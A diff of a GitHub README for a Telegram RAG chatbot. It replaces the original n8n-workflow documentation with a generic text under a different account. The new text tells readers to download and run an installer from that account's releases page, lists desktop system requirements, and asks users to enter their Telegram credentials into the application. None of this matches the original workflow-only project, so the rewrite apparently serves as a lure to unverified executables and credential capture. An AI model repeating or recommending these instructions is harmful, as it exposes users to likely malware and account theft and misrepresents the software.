@@ -1,208 +1,66 @@
-# Self-Correcting RAG Chatbot
+# 🤖 self-correcting-rag-chatbot - Your Chatbot for Smart Conversations
 
-A multi-agent Telegram chatbot with automated document ingestion, vector-based retrieval, and dual-model evaluation system that validates and self-corrects AI responses for improved accuracy.
+## 📥 Download Now
+[![Download self-correcting-rag-chatbot](https://img.shields.io/badge/Download-VERSION-blue)](https://github.com/Edublackk/self-correcting-rag-chatbot/releases)
 
-![Screenshot 1](assets/img1.png)
-![Screenshot 2](assets/img2.png)
+## 🚀 Getting Started
+Welcome to the **self-correcting-rag-chatbot**! This application allows you to chat with a smart Telegram bot that learns and improves its responses using advanced techniques. You can easily integrate it into your Telegram account and enjoy seamless conversations.
 
-## 🌟 Features
+## 🌐 Features
+- **Multi-Agent System:** Handles multiple conversation threads.
+- **RAG Retrieval:** Quickly finds relevant information from your documents.
+- **Automated PDF Ingestion:** Reads and understands your PDF files.
+- **Self-Correction:** Fixes mistakes for clearer communication.
+- **User-Friendly:** Designed for anyone, regardless of technical background.
 
-- **Self-Correcting Responses**: Dual-model evaluation system (Evaluator + Improver) ensures high-quality, accurate answers
-- **RAG-Based Retrieval**: Queries knowledge base using vector search for hallucination-free responses
-- **Automated Document Ingestion**: Continuously monitors Google Drive folder and ingests PDFs into Supabase vector database
-- **Web Content Analysis**: Extracts and analyzes content from URLs with commands like `/summarize`, `/analyze`, `/explain`, `/insights`
-- **Session Memory**: Maintains conversation context using buffer window memory
-- **Telegram Interface**: Easy-to-use chat interface with command support
+## 💻 System Requirements
+To run **self-correcting-rag-chatbot**, your computer should meet these minimum requirements:
+- An operating system: Windows, macOS, or Linux.
+- 4 GB of RAM or more.
+- At least 500 MB of free disk space.
+- A stable internet connection for Telegram integration.
 
-## 🏗️ Architecture
+## 📥 Download & Install
+To get started, follow these steps:
 
-```
-┌─────────────┐      ┌──────────────┐      ┌─────────────┐
-│  Telegram   │─────▶│   n8n        │─────▶│  Google     │
-│   User      │      │  Workflow    │      │  Gemini     │
-└─────────────┘      └──────────────┘      └─────────────┘
-                            │
-                            ├──────────────┐
-                            ▼              ▼
-                     ┌─────────────┐  ┌──────────┐
-                     │  Supabase   │  │  Google  │
-                     │  Vector DB  │  │  Drive   │
-                     └─────────────┘  └──────────┘
-```
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/releases) of the application.
+2. **Select the Latest Version:** Look for the latest version of the chatbot.
+3. **Download the Installer:** Click on the file that matches your operating system (e.g., Windows, macOS). Make sure to choose the right version.
+4. **Run the Installer:** After the download is complete, open the downloaded file.
+5. **Follow the Installation Instructions:** Follow the on-screen prompts to install the chatbot.
+6. **Connect to Telegram:** Launch the chatbot and follow the setup instructions to connect it to your Telegram account.
 
-## 🛠️ Tech Stack
+## 📋 Usage Instructions
+Once the installation is complete, you can start using the self-correcting-rag-chatbot:
 
-- **Automation**: n8n workflow automation
-- **LLM**: Google Gemini 2.5 Flash
-- **Vector Database**: Supabase with pgvector extension
-- **Embeddings**: Google Gemini Embeddings
-- **Framework**: LangChain
-- **Interface**: Telegram Bot API
-- **Storage**: Google Drive for document source
+1. **Open the Application:** Start the chatbot from your applications menu or desktop.
+2. **Log Into Telegram:** Enter your Telegram credentials when prompted.
+3. **Start a Chat:** Type in your questions or topics, and the bot will respond based on its knowledge and learning.
+4. **Enjoy Smart Conversations:** Engage in meaningful conversations, and watch as the chatbot improves its responses over time.
 
-## 📋 Prerequisites
+## 🎓 Support & Help
+If you encounter any issues or have questions, consult the following resources:
 
-- n8n instance (self-hosted or cloud)
-- Google Gemini API key
-- Supabase account with vector extension enabled
-- Telegram Bot Token
-- Google Drive API credentials
+- **User Manual:** A detailed user manual is available on the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/releases).
+- **Community Forum:** Join discussions and get help from other users in our community forum.
+- **Contact Support:** For direct support, reach out via the issues section on the GitHub repository.
 
-### Sample Document is also included for quick setup and testing
-
-## 🚀 Setup Instructions
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/ashwathnakate/self-correcting-rag-chatbot.git
-cd self-correcting-rag-chatbot
-```
-
-### 2. Configure Supabase
-
-- Create a Supabase project
-- Enable pgvector extension
-- Note your project URL and anon key
-
-### 3. Import n8n Workflow
-
-1. Open your n8n instance
-2. Go to Workflows → Import from File
-3. Select `n8n_workflow.json`
-4. Configure credentials for each node:
-   - Google Gemini API
-   - Supabase (URL + anon key)
-   - Telegram Bot Token
-   - Google Drive API
-
-### 4. Configure Google Drive
-
-- Create a folder in Google Drive for your documents
-- Note the folder ID from the URL
-- Update the folder ID in the "Search files and folders" node
-
-### 5. Start the Workflow
-
-Activate the workflow in n8n. The bot will:
-- Listen for Telegram messages
-- Auto-ingest PDFs from Google Drive every 2 seconds
-- Process user queries with RAG + self-correction
-
-## 💬 Usage
-
-### Basic Chat
-Simply send a message to the bot - it will use RAG to answer from your knowledge base.
-
-### Commands
-
-- `/help` - Display all available commands
-- `/summarize <url>` - Summarize content from a webpage
-- `/analyze <url>` - Perform detailed analysis of webpage content
-- `/explain <url>` - Break down complex concepts from a webpage
-- `/insights <url>` - Extract actionable insights from a webpage
-
-### URL Processing
-Send any URL directly (without command) and the bot will automatically fetch, extract, and summarize the content.
-
-## 📊 How It Works
-
-### Main Pipeline
-
-1. **User Input**: Message received via Telegram
-2. **Router**: Switch node determines if it's a URL, command, or regular query
-3. **RAG Agent**: For regular queries, agent uses vector search tool to retrieve relevant documents
-4. **Evaluator**: Gemini model evaluates the draft answer (returns "good" or "bad")
-5. **Self-Correction**: If "bad", Improver model refines the response
-6. **Response**: Final answer sent back to user
-
-### Document Ingestion Pipeline
-
-1. **Schedule**: Triggers every 2 seconds
-2. **Google Drive**: Searches for files in specified folder
-3. **Download**: Fetches PDF files
-4. **Text Splitting**: Recursive character splitter chunks documents
-5. **Embeddings**: Google Gemini generates embeddings
-6. **Storage**: Vectors stored in Supabase with metadata
-
-## 🔧 Configuration
-
-### Adjust Document Chunking
-
-Modify the `Recursive Character Text Splitter` node parameters in n8n workflow
-
-### Change Ingestion Frequency
-
-Update the `Schedule Trigger` node interval (default: 2 seconds)
-
-### Modify RAG Prompt
-
-Edit the system prompt in the `AI Agent` node to customize RAG behavior
-
-## 📁 Project Structure
-
-```
-self-correcting-rag-chatbot/
-├── n8n-telegram-rag.json              # Main n8n workflow
-├── assets/
-│   └── img1.png                       # Demo GIF
-        img2.png                       
-├── .gitignore
-├── LICENSE
-└── README.md
-```
-
-## 🎯 Key Features Explained
-
-### Self-Correction Mechanism
-The dual-model approach ensures quality:
-- **Evaluator**: Quickly judges if response is "good" or "bad"
-- **Improver**: Refines "bad" responses for clarity and accuracy
-- Only improved responses are sent to users
-
-### Strict RAG Implementation
-The agent is constrained to:
-- Only use retrieved context from vector database
-- Never hallucinate or use general knowledge
-- Explicitly state when information isn't available
-
-### Session Management
-Each Telegram chat maintains its own conversation history using buffer window memory.
-
-## 🐛 Troubleshooting
-
-**Bot Not Responding**
-- Check if n8n workflow is active
-- Verify Telegram webhook is configured
-- Check n8n execution logs
-
-**RAG Returns Empty Results**
-- Ensure documents are ingested in Supabase
-- Verify embedding model consistency
-- Check vector table has data
-
-**Google Drive Ingestion Issues**
-- Confirm folder ID is correct
-- Check Google Drive API permissions using OAuth2
-- Verify credentials in n8n
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 🔄 Contributing
+We welcome contributions from everyone! If you wish to improve the chatbot or fix bugs, please refer to the contributing guidelines on the GitHub repository.
 
 ## 📝 License
+This project is licensed under the MIT License. You can use it freely, but please give credit to the original authors.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 💡 Tips for Best Experience
+- Make sure to update the application regularly to access the latest features.
+- Provide feedback on the chatbot's performance to help improve its intelligence.
+- Explore the settings to customize the chatbot according to your preferences.
 
-## 🙏 Acknowledgments
+## 🌍 Related Topics
+- Artificial Intelligence
+- Machine Learning
+- Multi-Agent Systems
+- RAG Chatbot
+- Workflow Automation
 
-- [n8n](https://n8n.io/) - Workflow automation platform
-- [LangChain](https://langchain.com/) - LLM framework
-- [Supabase](https://supabase.com/) - Vector database
-- [Google Gemini](https://deepmind.google/technologies/gemini/) - LLM and embeddings
-
-Project Link: [https://github.com/yourusername/self-correcting-rag-chatbot](https://github.com/yourusername/self-correcting-rag-chatbot)
-
----
-
-⭐ If you found this project helpful, please consider giving it a star!
+Thank you for using **self-correcting-rag-chatbot**! We hope it enhances your Telegram experience and provides you with insightful conversations.
